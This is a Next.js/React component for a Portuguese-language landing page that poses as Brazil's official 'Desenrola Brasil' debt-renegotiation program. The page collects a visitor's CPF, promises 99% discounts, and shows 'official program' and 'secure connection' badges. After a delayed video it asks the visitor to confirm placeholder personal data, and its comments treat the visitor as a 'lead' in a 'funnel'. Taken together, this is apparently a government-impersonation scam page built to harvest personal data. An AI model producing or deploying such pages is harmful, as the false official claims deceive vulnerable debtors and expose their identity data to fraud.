'use client'

import { useEffect, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import { Info, Lock, ShieldCheck } from 'lucide-react'

function formatarCpf(valor: string) {
  const digitos = valor.replace(/\D/g, '').slice(0, 11)
  return digitos
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
}

export default function RenegociarClient() {
  const [cpf, setCpf] = useState('')
  const [enviado, setEnviado] = useState(false)

  const valido = cpf.replace(/\D/g, '').length === 11

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!valido) return
    setEnviado(true)
  }

  if (enviado) {
    return <DadosConfirmacao />
  }

  return (
    <article className="w-full max-w-[640px] rounded-lg bg-white px-4 py-6 shadow-sm sm:px-6 sm:py-8 md:px-10 md:py-10">
      <img
        src="/assets/limpe-nome-logo.png"
        alt="Limpe seu Nome e Desenrola, Brasil!"
        className="mx-auto h-auto w-44 object-contain sm:w-56 md:w-72"
      />

      <p className="mt-4 text-center text-sm leading-snug text-gray-800 sm:mt-6 sm:text-base md:text-lg">
        <span className="mr-1 inline-block align-middle text-[#22c55e]">✅</span>
        <strong>ATUALIZADO</strong> - Informe seu CPF e clique em &quot;Continuar&quot; para
        <br className="hidden sm:block" /> renegociar suas dívidas com descontos de 99%
      </p>

      <form className="mt-6 sm:mt-8" onSubmit={handleSubmit}>
        <label htmlFor="cpf" className="mb-2 block text-sm font-bold text-gray-900 sm:text-base">
          CPF
        </label>
        <input
          id="cpf"
          name="cpf"
          type="tel"
          inputMode="numeric"
          autoComplete="off"
          placeholder="000.000.000-00"
          value={cpf}
          onChange={(e) => setCpf(formatarCpf(e.target.value))}
          className="w-full rounded-lg border border-gray-300 px-3 py-3.5 text-base text-gray-700 placeholder:text-gray-400 focus:border-transparent focus:ring-2 focus:ring-[#1e40af] focus:outline-none sm:px-4 sm:py-4 sm:text-lg"
          required
        />
        <button
          type="submit"
          disabled={!valido}
          className="mt-4 flex w-full items-center justify-center gap-2 rounded-full bg-[#1e40af] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#1a3696] disabled:cursor-not-allowed disabled:opacity-70 sm:mt-5 sm:py-4 sm:text-lg"
        >
          Continuar
        </button>
      </form>

      <div className="mt-6 flex items-start gap-3 rounded-lg bg-[#eef2ff] px-4 py-4 text-sm text-[#1e40af] sm:text-base">
        <Info className="mt-0.5 size-5 shrink-0" aria-hidden="true" />
        <p className="leading-snug">
          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
        </p>
      </div>

      <div className="mt-6 flex flex-wrap items-center justify-center gap-x-8 gap-y-2 text-sm text-gray-600">
        <span className="flex items-center gap-1.5">
          <Lock className="size-4" aria-hidden="true" /> Conexão segura
        </span>
        <span className="flex items-center gap-1.5">
          <ShieldCheck className="size-4" aria-hidden="true" /> Programa oficial
        </span>
      </div>
      <p className="mt-3 text-center text-xs text-gray-400">
        Sistema de Renegociação — Todos os direitos reservados
      </p>
    </article>
  )
}

// Dados genéricos exibidos após o vídeo (não temos API de CPF)
const DADOS_CLIENTE = {
  nome: 'CLIENTE',
  cpf: '000.000.000-00',
  nascimento: '01/01/1985',
  idade: 40,
}

function DadosConfirmacao() {
  const router = useRouter()
  const videoRef = useRef<HTMLVideoElement>(null)
  const [videoTerminou, setVideoTerminou] = useState(false)
  const [iniciou, setIniciou] = useState(false)

  // O vídeo não toca automaticamente: só começa alguns segundos depois
  // que o lead rola a página e o vídeo entra na tela.
  useEffect(() => {
    const el = videoRef.current
    if (!el || iniciou) return

    const observer = new IntersectionObserver(
      (entries) => {
        const visivel = entries[0]?.isIntersecting
        if (visivel && !iniciou) {
          setIniciou(true)
          observer.disconnect()
          window.setTimeout(() => {
            el.play().catch(() => {
              // Alguns navegadores bloqueiam reprodução com áudio;
              // nesse caso tocamos sem som para não travar o funil.
              el.muted = true
              el.play().catch(() => {})
            })
          }, 3000)
        }
      },
      { threshold: 0.5 },
    )

    observer.observe(el)
    return () => observer.disconnect()
  }, [iniciou])

  return (
    <article className="w-full max-w-[640px] space-y-6 rounded-lg bg-white px-4 py-6 shadow-sm sm:px-6 sm:py-8 md:px-10 md:py-10">
      <img
        alt="Uma nova chance para perdoar suas dívidas — Programa Desenrola Brasil"
        className="block h-auto w-full rounded-lg"
        src="/assets/nova-chance-hero.png"
      />

      <section
        aria-label="Mensagem de boas-vindas"
        className="w-full rounded-xl bg-[#1e40af] px-4 py-5 text-sm leading-relaxed text-white shadow-sm sm:px-6 sm:py-6 sm:text-base"
      >
        <p>
          Olá <span className="font-bold">{DADOS_CLIENTE.nome}</span>, esse é um canal oficial de atendimento do
          Desenrola Brasil e os seus dados estão seguros conosco. 🔒
        </p>
      </section>

      <section
        aria-label="Vídeo institucional"
        className="mx-auto w-full max-w-4xl overflow-hidden rounded-lg border border-gray-300 bg-black shadow-sm"
      >
        <video
          ref={videoRef}
          src="/assets/desenrola-brasil-atendimento.mp4"
          playsInline
          preload="auto"
          className="h-auto w-full object-contain"
          aria-label="Vídeo institucional do Desenrola Brasil"
          onEnded={() => setVideoTerminou(true)}
          onError={(e) => {
            ;(e.currentTarget.parentElement as HTMLElement).style.display = 'none'
            setVideoTerminou(true)
          }}
        >
          Seu navegador não suporta a reprodução de vídeo.
        </video>
      </section>

      {videoTerminou && (
        <section
          aria-label="Confirmação de dados"
          className="w-full rounded-xl bg-[#f3f4f6] px-4 py-5 shadow-sm sm:px-6 sm:py-6"
        >
          <h2 className="text-base font-bold text-[#1e40af] sm:text-lg">Para continuar, confirme seus dados:</h2>

          <dl className="mt-4 space-y-3 text-sm sm:text-base">
            <div>
              <dt className="font-bold text-gray-900">Nome:</dt>
              <dd className="text-[#1e40af]">{DADOS_CLIENTE.nome}</dd>
            </div>
            <div>
              <dt className="font-bold text-gray-900">CPF:</dt>
              <dd className="text-[#1e40af]">{DADOS_CLIENTE.cpf}</dd>
            </div>
            <div>
              <dt className="font-bold text-gray-900">Data de Nascimento:</dt>
              <dd className="text-[#1e40af]">
                {DADOS_CLIENTE.nascimento} ({DADOS_CLIENTE.idade} anos)
              </dd>
            </div>
          </dl>

          <div className="mt-6 flex flex-col items-stretch justify-end gap-3 sm:flex-row sm:items-center">
            <button
              type="button"
              onClick={() => router.push('/empresas')}
              className="rounded-full bg-[#1e40af] px-6 py-3 text-sm font-semibold text-white transition-colors hover:bg-[#1a3696] sm:text-base"
            >
              Sim, está correto.
            </button>
            <button
              type="button"
              className="rounded-full border-2 border-[#1e40af] px-6 py-3 text-sm font-semibold text-[#1e40af] transition-colors hover:bg-[#eef2ff] sm:text-base"
            >
              Não sou eu
            </button>
          </div>
        </section>
      )}
    </article>
  )
}
